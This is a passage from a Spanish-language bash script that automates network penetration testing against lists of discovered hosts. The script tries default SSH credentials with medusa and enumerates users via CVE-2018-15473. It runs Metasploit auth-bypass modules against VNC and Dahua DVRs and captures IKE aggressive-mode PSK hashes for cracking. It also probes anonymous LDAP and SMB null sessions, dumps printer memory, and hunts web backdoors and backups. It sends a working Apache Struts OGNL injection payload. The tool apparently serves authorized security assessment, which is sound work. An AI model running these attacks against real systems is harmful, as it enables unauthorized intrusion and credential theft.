		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt > .vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
		 echo ""
 	done <.servicios/telnet.txt
		
	#insert clean data	
	insert_data
fi # telnet


if [ -f .servicios/ssh.txt ]
then
	echo -e "$OKBLUE #################### SSH (`wc -l .servicios/ssh.txt`)######################$RESET"	    
	while read line; do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"			
		echo -e "\t[+] Obtener banner"
		echo -e "\tquit" | nc -w 4 $ip $port | strings | uniq> .banners/"$ip"_"$port".txt 2>/dev/null
		#SSHBypass
		grep --color=never "libssh" .banners/"$ip"_"$port".txt > .vulnerabilidades/"$ip"_"$port"_SSHBypass.txt 
		
		echo -e "\t[+] Probando vulnerabilidad CVE-2018-15473"	
		enumeracionUsuariosSSH.py --username root --port $port $ip > logs/vulnerabilidades/"$ip"_"$port"_CVE15473.txt 2>/dev/null
		grep "is a valid" logs/vulnerabilidades/"$ip"_"$port"_CVE15473.txt  > .vulnerabilidades/"$ip"_"$port"_CVE15473.txt
		
		echo -e "\t[+] Probando passwords"	
		medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt 2>/dev/null
		medusa -h $ip -u admin -e n -M ssh >> logs/vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt 2>/dev/null
		medusa -h $ip -u root -p root -M ssh >> logs/vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt 2>/dev/null
		medusa -h $ip -u root -e n -M ssh >> logs/vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt 2>/dev/null
		
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt > .vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt 2>/dev/null					
		echo ""
 	done <.servicios/ssh.txt
		
	#insert clean data	
	insert_data
fi # ssh




if [ -f .servicios/finger.txt ]
then
	echo -e "$OKBLUE #################### FINGER ######################$RESET"	    
	while read line; do
		ip=`echo $line | cut -f1 -d";"`		
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"		
		finger @$ip > .enumeracion/"$ip"_79_usuarios.txt &
		sleep 1
					# done true				        	        				
	done < .servicios/finger.txt
	
	# revisar si hay scripts ejecutandose
	while true; do
	finger_instancias=`ps aux | egrep 'finger|nmap' | wc -l`		
	if [ "$finger_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($finger_instancias)"				
		sleep 20
		else
			break		
		fi
	done	# done true	
	
	#insert clean data	
	insert_data	
fi


if [ -f .servicios/vpn.txt ]
then
	echo -e "$OKBLUE #################### VPN (`wc -l .servicios/vpn.txt`) ######################$RESET"	    
	for ip in $(cat .servicios/vpn.txt); do		
			
		echo -e "[+] Escaneando $ip:500"
		echo -e "\t[+] Probando si el modo agresivo esta habilitado "
		ike=`ike-scan -M $ip 2>/dev/null`
		if [[ $ike == *"HDR"* ]]; then
			echo -e "\t$OKRED[!] Modo agresivo detectado \n $RESET"
			echo $ike > .enumeracion/"$ip"_vpn_transforms.txt
			cp .enumeracion/"$ip"_vpn_transforms.txt logs/enumeracion/"$ip"_vpn_transforms.txt					
			ike-scan --aggressive --multiline --id=vpn --pskcrack=.vulnerabilidades/"$ip"_vpn_handshake.txt $ip > logs/vulnerabilidades/"$ip"_vpn_agresivo.txt 2>/dev/null ;						
		fi			
	done
	#insert clean data	
	insert_data
fi


if [ -f .servicios/vnc.txt ]
then
	echo -e "$OKBLUE #################### VNC (`wc -l .servicios/vnc.txt`) ######################$RESET"	    
	for line in $(cat .servicios/vnc.txt); do		
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"			
		vnc_response=`echo -e "\ta" | nc -w 3 $ip $port`
		if [[ ${vnc_response} == *"RFB 003.008"* ]];then
			echo -e "\tVNC bypass ($vnc_response)" > .vulnerabilidades/"$ip"_"$port"_bypass.txt 
		fi	
		echo -e "\t[+] Verificando autenticación"
		msfconsole -x "use auxiliary/scanner/vnc/vnc_none_auth;set RHOSTS $ip; set rport $port;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_VNCnopass.txt 2>/dev/null		
		egrep --color=never -i "None" logs/vulnerabilidades/"$ip"_"$port"_VNCnopass.txt  > .vulnerabilidades/"$ip"_"$port"_VNCnopass.txt 
		
		echo -e "\t[+] Verificando Vulnerabilidad de REALVNC"
		echo "nmap -n -p $port --script realvnc-auth_bypass $ip" > logs/vulnerabilidades/"$ip"_"$port"_VNCbypass.txt 2>/dev/null
		nmap -Pn -n -p $port --script realvnc-auth_bypass $ip >> logs/vulnerabilidades/"$ip"_"$port"_VNCbypass.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/"$ip"_"$port"_VNCbypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_VNCbypass.txt
	done
	
	#insert clean data	
	insert_data
fi


# enumerar MS-SQL
if [ -f .servicios/mssql.txt ]
then
	echo -e "$OKBLUE #################### MS-SQL (`wc -l .servicios/mssql.txt`) ######################$RESET"	    
	while read line           
	do   	
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Obteniendo información de MS-SQL"
		echo "nmap -sU -n -sV -p 1434 --host-timeout 10s --script ms-sql-info $ip" >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
		nmap -sU -n -sV -p 1434 --host-timeout 10s --script ms-sql-info $ip >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
		grep "|" logs/enumeracion/"$ip"_1434_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .enumeracion/"$ip"_1434_info.txt 
					
		 echo ""
 	done <.servicios/mssql.txt
 		
	#insert clean data	
	insert_data
fi
		

#LDAPS
if [ -f .servicios/ldaps.txt ]
then
	echo -e "$OKBLUE #################### LDAPS (`wc -l .servicios/ldaps.txt`) ######################$RESET"	    
	while read line       
	do     					
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		
		echo -e "[+] Escaneando $ip:$port"	

		echo -e "\t[+] Obteniendo dominio"				
		dominio=`nmap -n -p $port --script ldap-rootdse $ip | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
				
		if [ -z "$dominio" ]; then
			dominio=`nmap -n -p $port --script ldap-rootdse $ip | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
		fi
		
		if [ -z "$dominio" ]; then
			echo -e "\t[i] No se pudo obtener el dominio"
		else
			echo $dominio > .enumeracion/"$ip"_"$port"_dominio.txt			
			echo -e "\t[+] Comprobando acceso anónimo"
			echo "ldapsearch -x -p $port -h $ip -b $dominio -s sub \"(objectclass=*)\"" > logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt 
			ldapsearch -x -p $port -h $ip -b $dominio -s sub "(objectclass=*)" >> logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt 
			#ldapsearch -x -s base -b '' -H  ldap://my.lapdap.server "(objectClass=*)" "*" +  
			egrep -iq "successful bind must be completed|Not bind|Invalid DN syntax|Can't contact LDAP server" logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then						
				echo -e "\t$OKGREEN[i] Requiere autenticación $RESET"
			else
				cp logs/enumeracion/"$ip"_"$port"_directorioLDAP.txt .vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
				echo -e "\t$OKRED[!] Acceso anónimo detectado \n $RESET"
			fi
		
		fi #fin sin dominio
		
													 
		 echo ""
 	done <.servicios/ldaps.txt
	
	#insert clean data	
	insert_data
fi


#CITRIX
if [ -f .servicios/citrix.txt ]
then
	echo -e "$OKBLUE #################### citrix (`wc -l .servicios/citrix.txt`) ######################$RESET"	    
	while read line       
	do     				
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Enumerando aplicaciones y dato del servidor"
		
		echo "nmap -n -sU --script=citrix-enum-apps -p 1604 $ip" > logs/enumeracion/"$ip"_1604_citrixApp.txt 2>/dev/null
		echo "nmap -n -sU --script=citrix-enum-servers -p 1604  $ip" > logs/enumeracion/"$ip"_1604_citrixServers.txt 2>/dev/null
		
		nmap -n -sU --script=citrix-enum-apps -p 1604 $ip >> logs/enumeracion/"$ip"_1604_citrixApp.txt 2>/dev/null
		nmap -n -sU --script=citrix-enum-servers -p 1604  $ip >> logs/enumeracion/"$ip"_1604_citrixServers.txt 2>/dev/null
		
		grep "|" logs/enumeracion/"$ip"_1604_citrixApp.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .enumeracion/"$ip"_1604_citrixApp.txt 
		grep "|" logs/enumeracion/"$ip"_1604_citrixServers.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .enumeracion/"$ip"_1604_citrixServers.txt 
													 
		 echo ""
 	done <.servicios/citrix.txt
		
	
	#insert clean data	
	insert_data	
fi

#	dahua

if [ -f .servicios/dahua_dvr.txt ]
then
	echo -e "$OKBLUE #################### DAHUA (`wc -l .servicios/dahua_dvr.txt`)######################$RESET"	    
	while read line       
	do     			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`			
		echo -e "[+] Escaneando $ip:$port"								
		echo -e "\t[+] Probando vulnerabilidad de Dahua"		
		echo "msfconsole -x 'use auxiliary/scanner/misc/dahua_dvr_auth_bypass;set RHOSTS $ip; set ACTION USER;run;exit'" >> logs/vulnerabilidades/"$ip"_37777_vulndahua.txt 2>/dev/null
		msfconsole -x "use auxiliary/scanner/misc/dahua_dvr_auth_bypass;set RHOSTS $ip; set ACTION USER;run;exit" >> logs/vulnerabilidades/"$ip"_37777_vulndahua.txt 2>/dev/null
					
		egrep -iq "admin" logs/vulnerabilidades/"$ip"_37777_vulndahua.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKRED[!] Dahua vulnerable \n $RESET"
			cp logs/vulnerabilidades/"$ip"_37777_vulndahua.txt .vulnerabilidades/"$ip"_37777_vulndahua.txt
		else
			echo -e "\t$OKGREEN[i] Dahua no vulnerable $RESET"
		fi					
															
		 echo ""
 	done <.servicios/dahua_dvr.txt		
	
	#insert clean data	
	insert_data
	
fi


#	elasticsearch

if [ -f .servicios/elasticsearch.txt ]
then
	echo -e "$OKBLUE #################### Elastic search (`wc -l .servicios/elasticsearch.txt`)######################$RESET"	    
	while read line       
	do     			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"																	
		echo -e "\t[+] Probando enumeracion de elasticsearch"		
		echo "msfconsole -x 'use auxiliary/scanner/elasticsearch/indices_enum;set RHOSTS $ip; run;exit'" >> logs/vulnerabilidades/"$ip"_elasticsearch_vuln.txt 2>/dev/null
		msfconsole -x "use auxiliary/scanner/elasticsearch/indices_enum;set RHOSTS $ip; run;exit" >> logs/vulnerabilidades/"$ip"_elasticsearch_vuln.txt 2>/dev/null
		grep --color=never "Indices found" logs/vulnerabilidades/"$ip"_elasticsearch_vuln.txt  > .vulnerabilidades/"$ip"_elasticsearch_vuln.txt 
	    #exploit/multi/elasticsearch/search_groovy_script 																	
		 echo ""
 	done <.servicios/elasticsearch.txt
				
	#insert clean data	
	insert_data	
fi


if [ -f .servicios/juniper.txt ]
then
	echo -e "$OKBLUE #################### Juniper (`wc -l .servicios/juniper.txt`)######################$RESET"	    
	while read line       
	do     			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"																	
		echo -e "\t[+] Enumerando juniper"		
		juniperXML.pl -url "http://$ip:$port" > logs/enumeracion/"$ip"_juniper_hostname.txt 2>/dev/null
		cp logs/enumeracion/"$ip"_juniper_hostname.txt .enumeracion/"$ip"_juniper_hostname.txt
																		
		 echo ""
 	done <.servicios/juniper.txt
				
	#insert clean data	
	insert_data	
fi


#INTEL
if [ -f .servicios/intel.txt ]
then
	echo -e "$OKBLUE #################### intel (`wc -l .servicios/intel.txt`) ######################$RESET"	    
	while read line       
	do     				
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"																	
		echo -e "\t[+] Probando vulnerabilidad"				
		echo "nmap -n -p 16992 --script http-vuln-cve2017-5689 $ip" > logs/vulnerabilidades/"$ip"_intel_bypass.txt 2>/dev/null
		nmap -n -p 16992 --script http-vuln-cve2017-5689 $ip >> logs/vulnerabilidades/"$ip"_intel_bypass.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/"$ip"_intel_bypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_intel_bypass.txt
													 
		 echo ""
 	done <.servicios/intel.txt	
	
	#insert clean data	
	insert_data
fi





#	servers
if [ -f .servicios/servers.txt ]
then
	echo -e "$OKBLUE #################### Servers (`wc -l .servicios/servers.txt`)######################$RESET"	    
	while read ip       
	do     			
		#ip=`echo $line | cut -f1 -d":"`		
		echo -e "[+] Escaneando $ip"
		echo -e "\t[+] Probando vulnerabilidad de sesión nula"
		###### Enum4linux ######
		echo "enum4linux $ip 2>/dev/null | grep -iv \"unknown\"" > logs/vulnerabilidades/"$ip"_"$port"_enum4linux.txt 
		enum4linux $ip 2>/dev/null | grep -iv "unknown" >> logs/vulnerabilidades/"$ip"_"$port"_enum4linux.txt 
		egrep -qi "Enumerating users using" logs/vulnerabilidades/"$ip"_"$port"_enum4linux.txt 
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then					     
		    echo -e "\t$OKRED[!] Sesión nula detectada \n $RESET"
			cp logs/vulnerabilidades/"$ip"_"$port"_enum4linux.txt  .vulnerabilidades/"$ip"_445_enum4linux.txt 
		else
			
			echo -e "\t$OKGREEN[i] No sesión nula $RESET"
		fi		
		#######################
															
		 echo ""
 	done <.servicios/servers.txt		
	#insert clean data	
	insert_data
	
fi



if [ -f .servicios/ldap.txt ]
then
	echo -e "$OKBLUE #################### LDAP (`wc -l .servicios/ldap.txt`) ######################$RESET"	    
	while read line          
	do        
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Obteniendo dominio"	
		dominio=`nmap -n -p $port --script ldap-rootdse $ip | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
		echo $dominio > .enumeracion/"$ip"_"$port"_dominio.txt		
		###### LDAP ######
		if [ -z "$dominio" ]; then			
			echo -e "\t[i] No se pudo obtener el dominio "
		else
			echo -e "\t[+] Probando vulnerabilidad de conexión anónima con el dominio $dominio"
			echo "ldapsearch -x -p $port -h $ip -b $dominio -s sub \"(objectclass=*)\"" > logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
			ldapsearch -x -p $port -h $ip -b $dominio -s sub "(objectclass=*)" >> logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
					
			egrep -iq "successful bind must be completed|Not bind|Operation unavailable|Can't contact LDAP server" logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then						
				echo -e "\t$OKGREEN[i] Requiere autenticación $RESET"
			else
				echo -e "\t$OKRED[!] Conexión anónima detectada \n $RESET"
				cp logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt .vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
			fi
		
		fi # fin sin dominio
				
		####################        
		
		 echo ""
 	done <.servicios/ldap.txt
		
	#insert clean data	
	insert_data
fi	


if [ -f .servicios/printers.txt ]
then
	echo -e "$OKBLUE #################### Printers (`wc -l .servicios/printers.txt`) ######################$RESET"	    		
	echo ls >> command.txt
	echo -e "\tnvram dump" >> command.txt	
	echo quit >> command.txt
	for line in $(cat .servicios/printers.txt); do
        ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Probando lectura de RAM"			
		
		echo "pret.sh --safe $ip pjl -i `pwd`/command.txt | egrep -iv \"\||Checking|ASCII|_|jan\" | tail -n +4" > logs/enumeracion/"$ip"_9100_PJL.txt 2>/dev/null 	
		pret.sh --safe $ip pjl -i `pwd`/command.txt | egrep -iv "\||Checking|ASCII|_|jan" | tail -n +4 >> logs/enumeracion/"$ip"_9100_PJL.txt 2>/dev/null 	
		cp logs/enumeracion/"$ip"_9100_PJL.txt .enumeracion/"$ip"_9100_PJL.txt 
			
    done;   
    rm command.txt   
    #insert clean data	
	insert_data
    
fi	



if [ -f .servicios/web.txt ]
then
      
    echo -e "$OKBLUE #################### WEB (`wc -l .servicios/web.txt`) ######################$RESET"	    
    ################ Obtener Informacion tipo de servidor, CMS, framework, etc ###########3
	for line in $(cat .servicios/web.txt); do  
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`					
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
			if [[ $free_ram -gt $min_ram && $perl_instancias -lt 10  ]];then 											
				echo -e "[+] Escaneando $ip:$port"	
				echo -e "\t[+] Revisando server-status"
				curl --max-time 2 http://$ip:$port/server-status 2>/dev/null | grep --color=never nowrap | sed 's/<\/td>//g' | sed 's/<td nowrap>/;/g' | sed 's/<\/td><td>//g'| sed 's/<\/td><\/tr>//g' | sed 's/amp;//g' > .enumeracion/"$ip"_"$port"_serverStatus.txt 
				echo -e "\t[+] Obteniendo informacion web"
				webData.pl -t $ip -p $port -s 0 -e todo -d / -l logs/enumeracion/"$ip"_"$port"_webData.txt -r 4 > .enumeracion/"$ip"_"$port"_webData.txt 2>/dev/null  &								
				sleep 0.1;
			
				######## revisar por dominio #######
				if grep -q ";" "$prefijo$FILE" 2>/dev/null; then			
					lista_subdominios=`grep $ip $prefijo$FILE | cut -d ";" -f2`
					for subdominio in $lista_subdominios; do					
						echo -e "\t\t[+] Obteniendo informacion web (subdominio: $subdominio)"	
						# no sigue redireccion (-r 0) para evitar que escaneemos 2 veces el mismo sitio
						webData.pl -t $subdominio -p $port -s 0 -e todo -d / -l logs/enumeracion/"$subdominio"_"$port"_webData.txt -r 0 > .enumeracion/"$subdominio"_"$port"_webData.txt 2>/dev/null 						
					done
				fi
				################################	
				break												
			else				
				perl_instancias=`ps aux | grep perl | wc -l`
				echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
				sleep 3									
			fi		
		done # while true		
	done # for
		
	 ######## wait to finish web info ########
	  while true; do
		perl_instancias=$((`ps aux | grep webData | wc -l` - 1)) 
		if [ "$perl_instancias" -gt 0 ]
		then
			echo -e "\t[i] Todavia hay escaneos de perl activos ($perl_instancias)"  
			sleep 30
		else
			break		  		 
		fi				
	  done
	###########################################################


  # Web buster & clone
	for line in $(cat .servicios/web.txt); do    
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`				
		echo -e "[+] Escaneando $ip:$port"
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
			if [[ $free_ram -gt $min_ram && $perl_instancias -lt 10  ]];then 
			
				#################  Realizar el escaneo por dominio  ##############				
				if grep -q ";" "$prefijo$FILE" 2>/dev/null; then
					lista_subdominios=`grep $ip -a $prefijo$FILE | cut -d ";" -f2`
					for subdominio in $lista_subdominios; do													
						echo -e "\t[+] subdominio: $subdominio"							
						egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect" .enumeracion/"$subdominio"_"$port"_webData.txt
						greprc=$?	
						if [[ $greprc -eq 1 ]];then # no redirecciona a otro dominio o es error de proxy
																											
							if [ $internet == "s" ]; then 	
								echo -e "\t[+] identificar si el host esta protegido por un WAF "
								wafw00f http://$subdominio:$port > logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt
								grep "is behind" logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt > .enumeracion/"$subdominio"_"$port"_wafw00f.txt								
	
								echo -e "\t[+] Detectando si hay balanceador de carga  "							
								lbd $subdominio > logs/enumeracion/"$subdominio"_web_balanceador.txt
								grep "does Load-balancing" logs/enumeracion/"$subdominio"_web_balanceador.txt > .enumeracion/"$subdominio"_web_balanceador.txt								
							fi	
    
							

  							###  if the server is apache ######
							egrep -i "apache|nginx" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS" # solo el segundo egrep poner "-q"
							greprc=$?
							if [[ $greprc -eq 0 && ! -f .enumeracion/"$subdominio"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
												
												  
								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
									echo -e "\t[+] Revisando directorios comunes ($subdominio - Apache/nginx)"
									web-buster.pl -t $subdominio  -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$subdominio"_"$port"_webdirectorios.txt  &
									sleep 2					
								fi																	
								echo -e "\t[+] Revisando paneles administrativos ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio  -p $port -h 2 -d / -m admin -s 0 -q 1  >> logs/enumeracion/"$subdominio"_"$port"_admin.txt
								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_admin.txt > .enumeracion/"$subdominio"_"$port"_admin.txt 
								sleep 2
								
								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio  -p $port -h 2 -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt
								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt > .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								sleep 2

								echo -e "\t[+] Revisando backups de archivos de configuración ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backupApache -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt   >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								sleep 2
								
								egrep -iq "is behind" .enumeracion/"$subdominio"_"$port"_wafw00f.txt
								greprc=$?
								if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app								
									echo -e "\t[+] Revisando archivos CGI ($subdominio - Apache/nginx)"
									web-buster.pl -t $subdominio -p $port -h 2 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt; 
									cat .servicios/cgi.txt >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt
									sleep 2								
								fi																							
							
								
								echo -e "\t[+] Revisando archivos peligrosos ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m archivosPeligrosos -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_archivosPeligrosos.txt  
								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_archivosPeligrosos.txt  | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_archivosPeligrosos.txt  
								sleep 2
								
								echo -e "\t[+] Revisando la existencia de backdoors ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backdoorApache -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_backdoor.txt 
								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_backdoor.txt  | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_backdoor.txt 								
								sleep 2
								
								echo -e "\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m divulgacionInformacion -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$subdominio"_"$port"_divulgacionInformacion.txt 2>/dev/null # solo a la carpeta logs
																							
								echo -e "\t[+] Revisando vulnerabilidad slowloris ($subdominio)"
								echo "nmap --script http-slowloris-check -p $port $subdominio" > logs/vulnerabilidades/"$subdominio"_"$port"_slowloris.txt 2>/dev/null
								nmap --script http-slowloris-check -p $port $subdominio >> logs/vulnerabilidades/"$subdominio"_"$port"_slowloris.txt 2>/dev/null
								grep "|" logs/vulnerabilidades/"$subdominio"_"$port"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$subdominio"_"$port"_slowloris.txt
							fi						
							####################################	
							
							#######  if the server is IIS ######
							grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS"  # no redirecciona
							greprc=$?
							if [[ $greprc -eq 0 && ! -f .enumeracion/"$subdominio"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes							
								
								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
									echo -e "\t[+] Revisando directorios comunes ($subdominio - IIS)"								
									web-buster.pl -t $subdominio -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$subdominio"_"$port"_webdirectorios.txt  &
									sleep 2					
								fi	
								
								
								echo -e "\t[+] Revisando paneles administrativos ($subdominio - IIS)"								
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m admin -s 0 -q 1 >> logs/enumeracion/"$subdominio"_"$port"_admin.txt
								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_admin.txt >> .enumeracion/"$subdominio"_"$port"_admin.txt  
								sleep 2
								
								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - IIS)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								sleep 2
								
								echo -e "\t[+] Revisando archivos comunes de sharepoint ($subdominio - IIS)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m sharepoint -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								sleep 2
								
								echo -e "\t[+] Revisando archivos comunes de webservices ($subdominio - IIS)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webservices -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								sleep 2
								
								echo -e "\t[+] Revisando la existencia de backdoors ($subdominio - IIS)"								
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backdoorIIS -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_backdoor.txt
								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_backdoor.txt >> .vulnerabilidades/"$subdominio"_"$port"_backdoor.txt
								sleep 2
								
								echo -e "\t[+] Revisando backups de archivos de configuración ($subdominio - IIS)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backupIIS -s 0 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_backup.txt 
								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_backup.txt  >> .vulnerabilidades/"$subdominio"_"$port"_backup.txt 
								sleep 2										   
							fi
										
							####################################	
		
		
							#######  if the server is tomcat ######
							egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found" 
							greprc=$?				
							if [[ $greprc -eq 0 && ! -f .enumeracion/"$subdominio"_"$port"_webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
								
								echo -e "\t[+] Revisando Apache Struts"
								curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "http://$subdominio:$port/" > logs/vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt 2>/dev/null
								grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt > .vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt
						  		  
